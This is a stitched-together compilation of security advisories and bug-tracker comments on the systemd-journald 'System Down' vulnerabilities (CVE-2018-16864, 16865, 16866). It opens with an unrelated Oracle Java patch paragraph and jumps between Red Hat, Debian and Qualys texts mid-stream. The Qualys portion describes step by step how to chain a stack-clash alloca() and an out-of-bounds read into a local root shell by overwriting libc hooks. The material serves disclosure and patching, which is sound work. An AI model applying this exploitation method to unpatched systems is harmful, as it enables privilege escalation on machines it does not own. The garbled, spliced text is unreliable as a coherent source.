This Critical Patch Update contains 5 new security fixes for Oracle Java SE.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2019verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application (in Java SE 8) has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

This can lead to a denial of service attack or arbitrary code execution in some cases.   ```  [Comment 1](show_bug.cgi?id=1653855#c1)  Doran Moppert    2018-11-28 02:23:55 UTC  ``` This boils down to a large alloca(), making it possible to jump the stack pointer into the heap and corrupt the heap region (a "Stack Clash" attack).  Since the alloca()ed region is completely written, this will eventually lead to a crash.  The reporters describe achieving code execution by combining the attack with a thread race inside journald, with careful timing they are able to attack the stack of a neighbouring thread which will return to the attacker's pointer before the crash occurs.   ```  [Comment 2](show_bug.cgi?id=1653855#c2)  Doran Moppert    2018-11-28 02:25:23 UTC  ``` Some restriction is placed on this attack by get_process_cmdline() substituting ' ' for all non-printable characters; this makes code execution more difficult to achieve.   ```  [Comment 3](show_bug.cgi?id=1653855#c3)  Doran Moppert    2018-11-28 02:30:39 UTC  ``` This vulnerability was introduced in systemd v203.   ```  [Comment 4](show_bug.cgi?id=1653855#c4)  Laura Pardo    2018-11-28 13:20:51 UTC  ``` Acknowledgments:  Name: Qualys Research Labs   ```  [Comment 6](show_bug.cgi?id=1653855#c6)  Riccardo Schirone    2018-11-29 14:00:30 UTC  ``` Function dispatch_message_real() in journal/journald-server.c constructs a record to write to the journal by converting each field to a string with the format "<field-name>=<field-value". Such strings are constructed by using the strjoina() function defined in basic/string-util.h, which allocates the resulting string on the stack with alloca(). If an attacker is able to make the stack clash with another memory region by providing a large attacker-controlled string, it is possible to overwrite the other region's data, causing crashes or possibly gaining code execution.  In this particular case, a process may have a big cmdline (as read from /proc/<pid>/cmdline) that could clash the stack and crash systemd-journald or gain code execution from within systemd-journald's context.   ```  [Comment 9](show_bug.cgi?id=1653855#c9)  Riccardo Schirone    2018-12-03 12:24:54 UTC  ``` If systemd is compiled with -fstack-clash-protection flag, like in Fedora 28/29, the flaw is not exploitable because stack clashing is prevented.   ```  [Comment 11](show_bug.cgi?id=1653855#c11)  Riccardo Schirone    2018-12-03 13:35:27 UTC  ``` Small fix to [comment 0](show_bug.cgi?id=1653855#c0) (stack buffer overflow vs stack overflow)  > A flaw was found in systemd-journald. A stack buffer overflow when passing several MB of arguments to a program calling syslog function.  A stack overflow flaw was found in systemd-journald when passing several MB of arguments to a program calling syslog() function.   ```  [Comment 15](show_bug.cgi?id=1653855#c15)  Riccardo Schirone    2018-12-11 14:02:25 UTC  ``` Statement:  This issue affects the versions of systemd as shipped with Red Hat Enterprise Linux 7.

Package        : systemd
Version        : 215-17+deb8u9
CVE ID         : CVE-2018-16864 CVE-2018-16865
Debian Bug     : 918841 918848

Multiple vulnerabilities were found in the journald component of
systemd which can lead to a crash or code execution.

CVE-2018-16864

    An allocation of memory without limits, that could result in the
    stack clashing with another memory region, was discovered in
    systemd-journald when many entries are sent to the journal
    socket. A local attacker, or a remote one if
    systemd-journal-remote is used, may use this flaw to crash
    systemd-journald or execute code with journald privileges.

CVE-2018-16865

    An allocation of memory without limits, that could result in the
    stack clashing with another memory region, was discovered in
    systemd-journald when a program with long command line arguments
    calls syslog. A local attacker may use this flaw to crash
    systemd-journald or escalate his privileges. Versions through v240
    are vulnerable.

For Debian 8 "Jessie", these problems have been fixed in version
215-17+deb8u9.

We recommend that you upgrade your systemd packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

## Synopsis

Important: systemd security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A2402)

## Topic

An update for systemd is now available for Red Hat Enterprise Linux 7.3 Advanced Update Support, Red Hat Enterprise Linux 7.3 Telco Extended Update Support, and Red Hat Enterprise Linux 7.3 Update Services for SAP Solutions.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The systemd packages contain systemd, a system and service manager for Linux, compatible with the SysV and LSB init scripts. It provides aggressive parallelism capabilities, uses socket and D-Bus activation for starting services, offers on-demand starting of daemons, and keeps track of processes using Linux cgroups. In addition, it supports snapshotting and restoring of the system state, maintains mount and automount points, and implements an elaborate transactional dependency-based service control logic. It can also work as a drop-in replacement for sysvinit.

Security Fix(es):

* systemd: stack overflow when calling syslog from a command with long cmdline (CVE-2018-16864)
* systemd: stack overflow when receiving many journald entries (CVE-2018-16865)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

-- System of a Down, "Toxicity"
========================================================================
Summary
========================================================================
We discovered three vulnerabilities in systemd-journald
(https://en.wikipedia.org/wiki/Systemd):
- CVE-2018-16864 and CVE-2018-16865, two memory corruptions
(attacker-controlled alloca()s);
- CVE-2018-16866, an information leak (an out-of-bounds read).
CVE-2018-16864 was introduced in April 2013 (systemd v203) and became
exploitable in February 2016 (systemd v230). We developed a proof of
concept for CVE-2018-16864 that gains eip control on i386.
CVE-2018-16865 was introduced in December 2011 (systemd v38) and became
exploitable in April 2013 (systemd v201). CVE-2018-16866 was introduced
in June 2015 (systemd v221) and was inadvertently fixed in August 2018.
We developed an exploit for CVE-2018-16865 and CVE-2018-16866 that
obtains a local root shell in 10 minutes on i386 and 70 minutes on
amd64, on average. We will publish our exploit in the near future.
To the best of our knowledge, all systemd-based Linux distributions are
vulnerable, but SUSE Linux Enterprise 15, openSUSE Leap 15.0, and Fedora
28 and 29 are not exploitable because their user space is compiled with
GCC's -fstack-clash-protection.
This confirms https://grsecurity.net/an\_ancient\_kernel\_hole\_is\_not\_closed.php:
"It should be clear that kernel-only attempts to solve [the Stack Clash]
will necessarily always be incomplete, as the real issue lies in the
lack of stack probing."

-- System of a Down, "Suggestions"
We accidentally discovered CVE-2018-16864 while working on the exploit
for Mutagen Astronomy (CVE-2018-14634); if we pass several megabytes of
command-line arguments to a program that calls syslog(), then journald
crashes:

... it's the race
Can you break out?
-- System of a Down, "36"
CVE-2018-16864 is similar to a Stack Clash vulnerability
(https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt), but:
- Steps 1 (Clash the stack with another memory region) and 2 (Run the
stack pointer to the start of the stack) are not needed, because the
attacker-controlled alloca() can be very large (several megabytes of
command-line arguments); only Steps 3 (Jump over the stack guard page,
into another memory region) and 4 (Smash the stack, or another memory
region) are needed.
- In Step 4 (Smash), the alloca() is fully written to (the vulnerability
is essentially a stpcpy(alloca(strlen(cmdline) + 1), cmdline)), and
the stpcpy() (a "wild copy") will therefore always crash into a
read-only or unmapped memory region:
https://googleprojectzero.blogspot.com/2015/03/taming-wild-copy-parallel-thread.html
https://cansecwest.com/slides/2015/Taming%20wild%20copies%20-%20Chris%20evans.pdf
We tried to asynchronously interrupt this stpcpy() before it crashes,
with a signal or a timer, but we failed because journald uses signalfd()
and timerfd\_create() to handle these events synchronously.
We eventually gained control of eip (i386's instruction pointer) by
jumping into and smashing the stack of a concurrent thread (a "Parallel
Thread Corruption"):
- First, we send a large, high-priority message (LOG\_CRIT or higher) to
journald, from a process whose cmdline is small; this message forces a
large write() (between 1MB and 2MB) to /var/log/journal/ and forces
the creation of a short-lived thread that fsync()s the journal (the
stack of this thread is allocated in the mmap region).
- Next, we create several processes (between 32 and 64) that write() and
fsync() large files (between 1MB and 8MB) to /var/tmp/ (for example);
these processes stall journald's fsync() thread and will allow us to
win a tight race: exploit the "wild copy" before it crashes.
- Last, we send a small, low-priority message to journald, from a
process whose cmdline is very large (roughly 128MB, the distance
between the main stack and the mmap region); this message forces a
very large alloca() that jumps from journald's main stack into the
stack of the fsync() thread, and smashes a saved eip before fsync()
returns from kernel space.
On a Debian stable (9.5), our proof of concept wins this race and gains
eip control after a dozen tries (systemd automatically restarts journald
after each crash):
systemd-journal[2195]: segfault at 41414141 ip 41414141 sp b5f3d22c error 14
Despite this initial success, we abandoned the exploitation of
CVE-2018-16864: while working on our proof of concept, we discovered two
different vulnerabilities (CVE-2018-16865, another attacker-controlled
alloca(), and CVE-2018-16866, an information leak) that are reliably
exploitable on both i386 and amd64.

Can you feel their haunting presence?
-- System of a Down, "Holy Mountains"
Surprised by the heavy usage of alloca() in journald, we searched for
another attacker-controlled alloca() and found CVE-2018-16865:
1963 int journal\_file\_append\_entry(JournalFile \*f, const dual\_timestamp \*ts, const struct iovec iovec[], unsigned n\_iovec, uint64\_t \*seqnum, Object \*\*ret, uint64\_t \*offset) {
....
1986 items = alloca(sizeof(EntryItem) \* MAX(1u, n\_iovec));
1987
1988 for (i = 0; i < n\_iovec; i++) {
1989 uint64\_t p;
1990 Object \*o;
1991
1992 r = journal\_file\_append\_data(f, iovec[i].iov\_base, iovec[i].iov\_len, &o, &p);
1993 if (r < 0)
1994 return r;
1995
1996 xor\_hash ^= le64toh(o->data.hash);
1997 items[i].object\_offset = htole64(p);
1998 items[i].hash = o->data.hash;
1999 }
This vulnerability was introduced in systemd v38:
commit cf244689e9d1ab50082c9ddd0f3c4d1eb982badc
Date: Thu Dec 29 15:00:57 2011 +0100
...
- items = new(EntryItem, n\_iovec);
- if (!items)
- return -ENOMEM;
+ items = alloca(sizeof(EntryItem) \* n\_iovec);
and became exploitable in systemd v201:
commit c4aa09b06f835c91cea9e021df4c3605cff2318d
Date: Mon Apr 8 20:32:03 2013 +0200
...
-#define ENTRY\_SIZE\_MAX (1024\*1024\*64)

...
+#define ENTRY\_SIZE\_MAX (1024\*1024\*768)
+#define DATA\_SIZE\_MAX (1024\*1024\*768)
If we send a large "native" message to /run/systemd/journal/socket:
since the maximum size of a "native" entry is 768MB, and the minimum
length of a "native" item is 3 ("A=\n"), and the size of an EntryItem
structure is 16 (a 64-bit offset and a 64-bit hash), the maximum size of
the attacker-controlled alloca() in journal\_file\_append\_entry() is 768MB
/ 3 \* 16 = 4GB, large enough to jump from journald's main stack into the
mmap region, even on amd64.
On amd64, as described in the "64-bit exploitation" of our Stack Clash
advisory, the randomized distance between the main stack and the mmap
region is shorter than 4GB with a probability of (approximately):
SUM(d = 0; d < 4GB; d++) d / (16GB \* 1TB) ~= 1 / 2048
------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------
Jump (pogo, pogo, pogo, pogo, pogo, pogo, pogo)
-- System of a Down, "Bounce"
CVE-2018-16865 is basically a simplified Stack Clash vulnerability:
- Steps 1 (Clash) and 2 (Run) of the Stack Clash are not needed, since
the largest attacker-controlled alloca() is 4GB; only Steps 3 (Jump)
and 4 (Smash) are needed.
- In Step 4 (Smash), the alloca() is not necessarily fully written to:
if the size of an item is larger than 128MB (DEFAULT\_MAX\_SIZE\_UPPER),
then journal\_file\_append\_data() returns an error that breaks the "for"
loop in journal\_file\_append\_entry() (at lines 1992-1994) and avoids a
crash into a read-only or unmapped memory region.
We eventually transformed this vulnerability into a crude
"write-what-where" (https://cwe.mitre.org/data/definitions/123.html):
- "write-where": We jump into and smash libc's read-write segment, and
thereby overwrite a function pointer. Unfortunately this "write-where"
is not surgical: the stack frames of the functions called from within
the "for" loop (in journal\_file\_append\_entry()) smash a few kilobytes
below our target function pointer, and therefore overwrite vital libc
variables that may crash or deadlock journald. Consequently, we must
sometimes shift our alloca() jump slightly, to avoid overwriting such
vital variables.
- "write-what": We want to overwrite our target function pointer with
the address of another function or ROP chain, but unfortunately the
stack frames of the functions called from within the "for" loop (in
journal\_file\_append\_entry()) do not contain any data that we control.
However, the 64-bit "hash" values that are written to the alloca()ted
"items" are produced by jenkins\_hashlittle2(), a noncryptographic hash
function: we can easily find a short string (a preimage) that hashes
to a given value (the address that will overwrite our target function
pointer) and is also a valid\_user\_field() (or journal\_field\_valid()).
This "write-what" restricts our "write-where" to function pointers
whose address modulo 16 is equal to 8 (the offset of "hash" in the
EntryItem structure).
To complete our exploit, we need the address of journald's stack pointer
before the alloca() jump, and the address of our target function pointer
in libc's read-write segment -- we need an information leak.
========================================================================
CVE-2018-16866
========================================================================
------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------
When they speak, we can peek from the windows of their mouths
-- System of a Down, "Know"
We discovered an out-of-bounds read in journald (CVE-2018-16866), and
transformed it into an information leak:
31 #define WHITESPACE " \t\n\r"
...
194 size\_t syslog\_parse\_identifier(const char \*\*buf, char \*\*identifier, char \*\*pid) {
195 const char \*p;
...
197 size\_t l, e;
...
203 p = \*buf;
204
205 p += strspn(p, WHITESPACE);
206 l = strcspn(p, WHITESPACE);
207
208 if (l <= 0 ||
209 p[l-1] != ':')
210 return 0;
211
212 e = l;
...
240 if (strchr(WHITESPACE, p[e]))
241 e++;
242 \*buf = p + e;
243 return e;
244 }
If we send a syslog message to journald (in \*buf), and if the last
character of this message is a ':' (before the '\0' terminator), then:
- at line 240, p[e] is the '\0' terminator of our message;
- at line 240, strchr(WHITESPACE, p[e]) returns a pointer to the '\0'
terminator of the WHITESPACE string (as mentioned in man strchr: "The
terminating null byte is considered part of the string, so that if c
is specified as '\0', these functions return a pointer to the
terminator.");
- at line 241, e is incremented;
- at line 242, \*buf points out-of-bounds, to the first character after
the '\0' terminator of our message;
- later, the out-of-bounds string at \*buf (supposedly the body of our
syslog message) is written (leaked) to the journal.
Consequently, we can read this out-of-bounds string:
- either directly from the journal (if journald's "Storage" is
"persistent", or "auto" and /var/log/journal/ exists), because
journald supports extended file ACLs (Access Control Lists):
$ id

/var/run/utmp, because journald writes ("walls") emergency messages
(LOG\_EMERG) to the tty of every logged-in user; our exploit records a
tty to /var/run/utmp via an ssh connection to localhost, but other
methods exist (for example, utempter and gnome-pty-helper):

Exploitation
------------------------------------------------------------------------
For today we will take the body parts and put them on the wall
-- System of a Down, "Dreaming"
To leak a stack address or an mmap address from journald:
- First, we send a large native message to /run/systemd/journal/socket;
journald mmap()s our message, and malloc()ates a large array of iovec
structures: most of these structures point into our mmap()ed message,
but some of them point to the stack (in dispatch\_message\_real()). The
contents of this iovec array (especially the mmap and stack pointers)
are preserved in a heap hole after free() (after journald finishes
processing our message).
- Next, we send a large syslog message to /run/systemd/journal/dev-log;
to receive our large message (in server\_process\_datagram()), journald
realloc()ates its server buffer into the heap hole that previously
contained the iovec array (and still contains remains of mmap and
stack pointers).
- Last, we send a large syslog message that exploits CVE-2018-16866;
journald receives our large message in its server buffer (in the heap
chunk that previously contained the iovec array), and if we carefully
choose the size of our message and position its terminating ":" in
front of a remaining mmap or stack pointer, then we can leak this
pointer (it is mistakenly read out-of-bounds as the body of our
message).
From this leaked stack pointer we easily deduce journald's stack pointer
before the alloca() jump, because the distance between the two depends
only on journald's executable.
From the leaked mmap address we can deduce libc's address, but chunks of
unknown sizes are mmap()ed between the two, and we must therefore adopt
different strategies based on our target architecture (i386 or amd64).
========================================================================
Combined Exploitation of CVE-2018-16865 and CVE-2018-16866
========================================================================
Don't leave your seats now
Popcorn everywhere ...
-- System of a Down, "CUBErt"
------------------------------------------------------------------------
amd64 Exploitation
------------------------------------------------------------------------
- To deduce libc's address from the leaked mmap address of our native
message, we arrange for this message to be mmap()ed into the 2MB hole
between ld.so's read-execute and read-only segments: from this hole's
address we deduce ld.so's address, and hence libc's address (with help
from ldd's output).
- If the resulting stack-to-libc distance is jumpable (if it is shorter
than 4GB), then we proceed with our "write-what-where"; otherwise, we
restart journald (we crash it with an alloca() of RLIMIT\_STACK -- 8MB
by default) and try again.
We have a good chance of obtaining a jumpable stack-to-libc distance
(and hence a root shell) after 2048 tries \* 2 seconds ~= 68 minutes
(by default, if journald crashes less than 5 times within 10 seconds,
it is restarted automatically by systemd).
- For the "write-where" part of our "write-what-where", we overwrite
libc's \_\_free\_hook function pointer, whose address modulo 16 is always
equal to 8 (on every amd64 distribution that we exploited).
- For the "write-what" part of our "write-what-where", we overwrite
\_\_free\_hook with the address of libc's system() function: whenever
journald free()s data that we control, we achieve arbitrary command
execution.
Last-minute note: on CentOS 7, the usual function pointers in libc's
read-write segment (\_\_free\_hook, \_\_malloc\_hook, etc) are not located at
multiples of 16 plus 8. To circumvent this problem:
- First, we overwrite the "\_chain" pointer of stderr's FILE structure
with the address of our own fake FILE structure (this "\_chain" pointer
is located at a multiple of 16 plus 8, in libc's read-write segment).
- Next, we corrupt one of malloc's internal variables (also in libc's
read-write segment).
- Last, we force a call to malloc() or free(), which detects the
corruption of its internal variable and calls abort(), which calls
\_IO\_flush\_all\_lockp(), which follows stderr's overwritten "\_chain"
pointer to our fake FILE structure; we eventually achieve arbitrary
command execution by calling libc's system() via one of the function
pointers in our fake FILE structure.
------------------------------------------------------------------------
i386 Exploitation
------------------------------------------------------------------------
Our i386 exploit is very similar to the amd64 exploit, but:
- The stack-to-libc distance is always jumpable (it is roughly 128MB).
- There is no hole between ld.so's read-execute and read-only segments.
However, libc's address is randomized in a narrow range of 1MB and is
therefore brute forcible: we have a good chance of correctly guessing
libc's address after 1MB / 4KB = 256 tries \* 2 seconds ~= 8 minutes.
- For the "write-where" part of our "write-what-where", we overwrite
libc's \_\_malloc\_hook function pointer (\_\_free\_hook was never located
at a multiple of 16 plus 8 or 12 on the i386 distributions that we
exploited, but \_\_malloc\_hook always is).
- For the "write-what" part of our "write-what-where", we overwrite
\_\_malloc\_hook with the address of a "mov esp, 0x89fffa5d ; ret" gadget
(or equivalent stack pivot): since our native message can be as large
as 768MB, we can mmap() it at 0x89fffa5d, take control of the stack,
and return into libc's execve().

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=1653861#c0)  Laura Pardo    2018-11-27 19:00:23 UTC  ``` A flaw was found in systemd-journald. An uncontrolled alloca() by writing a crafted message to /run/systemd/journal/socket that results in a stack buffer overflow. This can lead to a denial of service attack or arbitrary code execution in some cases.   ```  [Comment 1](show_bug.cgi?id=1653861#c1)  Doran Moppert    2018-11-28 02:09:01 UTC  ``` The exploit described by reporter is a stack clash:  since crafted input can cause a maximum alloca() of 4GiB (which may not be entirely written to) it is possible to jump over the guard page if the randomized offset between the stack and the next writeable segment on the heap is smaller than this.  This is claimed to occur approx 1/2048 of the time.  Testing on rhel-7 bears this out approximately.  The rest of the time, this attack will be harmless (and noisy, as journald will log the message).  An attacker is not able to significantly increase their chances even if they were able to force journald to restart repeatedly:  default StartLimit* settings will throttle restarts to 5/sec.   ```  [Comment 2](show_bug.cgi?id=1653861#c2)  Doran Moppert    2018-11-28 02:30:17 UTC  ``` This vulnerability was introduced in systemd v38 and became exploitable in systemd v201.   ```  [Comment 3](show_bug.cgi?id=1653861#c3)  Laura Pardo    2018-11-28 13:21:31 UTC  ``` Acknowledgments:  Name: Qualys Research Labs   ```  [Comment 4](show_bug.cgi?id=1653861#c4)  Riccardo Schirone    2018-11-30 16:05:48 UTC  ``` Function journal_file_append_entry() in journal-file.c allocates an array of EntryItem structures through alloca(), however the number of entries can be controlled by a local attacker. By directly accessing the UNIX domain socket (by default at /run/systemd/journal/socket) a local attacker could send many items to the socket, making the alloca() function allocate the array on top of another memory region, overwriting data that resides there. This may crash systemd-journald or even allow to escalate the privileges of the attacker.   ```  [Comment 6](show_bug.cgi?id=1653861#c6)  Riccardo Schirone    2018-12-03 12:25:06 UTC  ``` If systemd is compiled with -fstack-clash-protection flag, like in Fedora 28/29, the flaw is not exploitable because stack clashing is prevented.   ```  [Comment 8](show_bug.cgi?id=1653861#c8)  Riccardo Schirone    2018-12-03 13:37:55 UTC  ``` Small fix to [comment 0](show_bug.cgi?id=1653861#c0) (stack buffer overflow vs stack overflow)  > A flaw was found in systemd-journald. An uncontrolled alloca() by writing a crafted message to /run/systemd/journal/socket that results in a stack buffer overflow.   A flaw was found in systemd-journald. An uncontrolled alloca() by writing a crafted message to /run/systemd/journal/socket that results in a stack overflow.   ```  [Comment 9](show_bug.cgi?id=1653861#c9)  Riccardo Schirone    2018-12-04 10:02:15 UTC  ``` Changing CVSSv3 to Attack Vector:Network (AV:N) because the attack can be performed through systemd-journal-remote service as well. The service allows to receive journal messages over the network and it can receive messages big enough to receive many items and trigger the flaw in journal_file_append_entry().   ```  [Comment 17](show_bug.cgi?id=1653861#c17)  Riccardo Schirone    2019-01-07 15:15:12 UTC  ``` Statement:  This issue affects the versions of systemd as shipped with Red Hat Enterprise Linux 7. Red Hat Product Security has rated this issue as having a security impact of Important because it allows an attacker to crash systemd-journald or escalate his privileges. For additional information, refer to the Issue Severity Classification: <https://access.redhat.com/security/updates/classification/>.  Red Hat Enterprise Linux 7 ships systemd-journal-remote through the optional systemd-journal-gateway package, which is not installed, nor enabled by default.   ```  [Comment 19](show_bug.cgi?id=1653861#c19)  Riccardo Schirone    2019-01-10 07:57:26 UTC  ``` Created systemd tracking bugs for this issue:  Affects: fedora-all [[bug 1664973](show_bug.cgi?id=1664973 "CLOSED ERRATA - CVE-2018-16865 systemd: stack overflow when receiving many journald entries [fedora-all]")]   ```  [Comment 20](show_bug.cgi?id=1653861#c20)  Riccardo Schirone    2019-01-10 07:59:31 UTC  ``` External References:  <https://www.qualys.com/2019/01/09/system-down/system-down.txt>   ```  [Comment 22](show_bug.cgi?id=1653861#c22)  Riccardo Schirone    2019-01-10 08:17:26 UTC  ``` Upstream patches: 